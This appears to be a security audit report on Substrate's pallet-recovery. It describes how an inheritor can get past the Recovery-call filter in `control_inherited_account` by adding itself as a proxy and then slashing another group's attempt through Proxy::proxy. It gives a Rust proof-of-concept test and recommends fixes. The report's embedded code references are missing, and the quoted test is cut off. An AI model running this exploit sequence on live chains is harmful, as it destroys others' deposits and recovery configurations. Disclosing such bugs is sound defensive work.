Audit Report

## Title
`control_inherited_account`'s reentrancy filter can be permanently defeated via a Proxy delegation set up through the very same guarded call - (File: `substrate/frame/recovery/src/lib.rs`)

## Summary
`pallet-recovery`'s `control_inherited_account` dispatches an arbitrary `RuntimeCall` as the recovered account through an origin that carries a one-shot filter blocking only direct `Recovery::Call` sub-types. Because the filter is attached to a single, freshly-constructed `RawOrigin::Signed(recovered)` object rather than any persistent state, an inheritor can use this call to make `pallet_proxy::Call::add_proxy` grant themselves a standing `Any` proxy over the recovered account, then in a completely separate, later extrinsic invoke `Proxy::proxy` to dispatch Recovery-pallet calls (e.g. `slash_attempt`, `set_friend_groups`) as the recovered account with no filter in effect at all.

## Finding Description
The guarded dispatch is implemented as follows: [1](#0-0) 

The filter only rejects calls that are themselves `Recovery::Call` variants (`c.is_sub_type().is_none()`), so any non-Recovery call — including `pallet_proxy::Call::add_proxy` — passes through unfiltered and is dispatched as the `recovered` account. This lets the inheritor register themselves as a persistent (`Any`) proxy of the recovered/lost account via storage in `pallet-proxy`, entirely outside of any Recovery-specific restriction.

The in-code documentation makes the intended invariant explicit: the controller "is not allowed to dispatch calls of the recovery pallet. Otherwise they could mess with the recovery configuration and possibly cancel or slash attempts from higher-priority friend groups." [2](#0-1) 

However, this invariant is only enforced for the single nested dispatch happening inside `control_inherited_account`. `origin.add_filter` in FRAME's `OriginTrait` attaches a filter to that specific origin *value*; it is not global, per-account state. Once a persistent delegation (a proxy relationship) is established in `pallet-proxy` storage via the guarded call, any later, independently originated `Proxy::proxy(real = lost, call = ...)` extrinsic constructs a brand-new `RawOrigin::Signed(lost)` from scratch — an origin object that never had `add_filter` invoked on it — and dispatches the inner call (e.g. `Recovery::slash_attempt`) with full privilege as `lost`. The existing regression test in the repository only checks the single-dispatch nested case via `pallet_utility::batch`, which correctly stays blocked because `utility::batch` reuses the *same* filtered origin instance: [3](#0-2) 

No test exercises the proxy-delegation path, which uses a separate, later, unfiltered origin instance rather than reusing the one instance carrying the guard. This is exactly the class of bug the claim describes: a documented safeguard exists on one call path but is silently absent on a semantically equivalent, persistent alternate path.

## Impact Explanation
An inheritor who legitimately gains `control_inherited_account` access can permanently and unilaterally seize control of the recovered account's recovery configuration by first registering itself as a proxy, then freely calling `slash_attempt` (destroying a higher-priority friend group's pending attempt and burning their security deposit) or `set_friend_groups`/`revoke_inheritor` (rewriting or erasing the recovery configuration) at will, with no further filtering. This is origin escalation against a public, unprivileged mechanism, and it directly contradicts the documented security guarantee of the pallet, matching the "unauthorized execution or origin escalation" and "public wrappers ... must not widen origin, bypass filters" impact categories from the Polkadot SDK Pivots.

## Likelihood Explanation
The precondition — being appointed `inheritor` of some recovered account — is the pallet's designed, ordinary use case, not a privileged or off-chain compromise. The exploit requires exactly two standard, always-available signed extrinsics: `control_inherited_account` wrapping `Proxy::add_proxy`, followed by an ordinary `Proxy::proxy` call. No validator, governance, or infrastructure compromise is needed, making this readily reproducible by any malicious inheritor.

## Recommendation
Do not rely solely on a transient, per-call `origin.add_filter` reentrancy guard. Either:
- Explicitly reject, within `control_inherited_account`, any dispatched call that would establish a persistent delegation over the `recovered` account (e.g. `pallet_proxy::Call::add_proxy`, multisig approvals adding new signatories, etc.), in addition to the existing `Recovery::Call` filter; or
- Maintain durable, per-account "controlled" state so that any later dispatch into Recovery extrinsics for that account is checked against this state regardless of which origin instance or pallet performed the dispatch.
- Add a regression test that establishes a proxy relationship via `control_inherited_account` and then exercises `Proxy::proxy` in a subsequent, separate extrinsic to confirm the reentrancy guard still holds end-to-end.

## Proof of Concept
```rust
// Setup: ALICE has friend groups Family (priority 0) and Friends (priority 1, inheritor = FERDIE).
// Friends group recovers ALICE first; FERDIE becomes inheritor.
assert_ok!(Recovery::set_friend_groups(signed(ALICE), vec![family, friends_group]));
assert_ok!(Recovery::initiate_attempt(signed(CHARLIE), ALICE, 1));
inc_block_number(2);
assert_ok!(Recovery::finish_attempt(signed(EVE), ALICE, 1));
assert_eq!(Recovery::inheritor(ALICE), Some(FERDIE));

// Family initiates a higher-priority attempt that FERDIE should not be able to slash.
assert_ok!(Recovery::initiate_attempt(signed(BOB), ALICE, 0));

// Step 1: FERDIE uses the guarded wrapper to add itself as an "Any" proxy of ALICE.
// Allowed: Proxy::add_proxy is not a Recovery::Call, so is_sub_type().is_none() passes.
let add_proxy_call: RuntimeCall =
    pallet_proxy::Call::add_proxy { delegate: FERDIE, proxy_type: ProxyType::Any, delay: 0 }.into();
assert_ok!(Recovery::control_inherited_account(signed(FERDIE), ALICE, Box::new(add_proxy_call)));

// Step 2: FERDIE dispatches Recovery::slash_attempt as ALICE via Proxy::proxy,
// completely outside of control_inherited_account's filtered origin instance.
let slash_call: RuntimeCall = RecoveryCall::slash_attempt { friend_group_index: 0 }.into();
assert_ok!(Proxy::proxy(signed(FERDIE), ALICE, None, Box::new(slash_call)));

// BOB's security deposit is now slashed and the Family attempt destroyed, defeating the guard.
```

/// Verify that wrapping a recovery call inside Utility::batch does not bypass the filter.
#[test]
fn inheritor_cannot_bypass_filter_via_utility_batch() {
	new_test_ext().execute_with(|| {
		let family = FriendGroupOf::<T> {
			friends: friends([BOB, CHARLIE]),
			friends_needed: 1,
			inheritor: DAVE,
			inheritance_delay: 10,
			inheritance_priority: 0,
			cancel_delay: 5,
		};
		let friends_group = FriendGroupOf::<T> {
			friends: friends([CHARLIE, EVE]),
			friends_needed: 1,
			inheritor: FERDIE,
			inheritance_delay: 1,
			inheritance_priority: 1,
			cancel_delay: 5,
		};
		assert_ok!(Recovery::set_friend_groups(signed(ALICE), vec![family, friends_group]));

		// Friends group recovers first (CHARLIE's auto-approval reaches the threshold).
		assert_ok!(Recovery::initiate_attempt(signed(CHARLIE), ALICE, 1));
		inc_block_number(2);
		assert_ok!(Recovery::finish_attempt(signed(EVE), ALICE, 1));
		assert_eq!(Recovery::inheritor(ALICE), Some(FERDIE));

		// Family initiates higher-priority attempt
		assert_ok!(Recovery::initiate_attempt(signed(BOB), ALICE, 0));
		let bob_balance_before = <Test as Config>::Currency::total_balance(&BOB);

		// FERDIE wraps the slash inside a utility::batch call to try to bypass the filter
		let slash_call: RuntimeCall = RecoveryCall::slash_attempt { friend_group_index: 0 }.into();
		let batch_call: RuntimeCall =
			pallet_utility::Call::batch { calls: vec![slash_call] }.into();
		assert_ok!(Recovery::control_inherited_account(
			signed(FERDIE),
			ALICE,
			Box::new(batch_call),
		));

		// The batch dispatched as ALICE, but the inner slash should have still executed
		// since our filter only checks the outer call. Check if BOB was slashed:
		let bob_balance_after = <Test as Config>::Currency::total_balance(&BOB);
		let was_slashed = bob_balance_after < bob_balance_before;

		if was_slashed {
			panic!(
				"BYPASS: recovery call filter was circumvented via utility::batch! \
				 BOB lost {} from security deposit slash.",
				bob_balance_before - bob_balance_after
			);
		}
	});
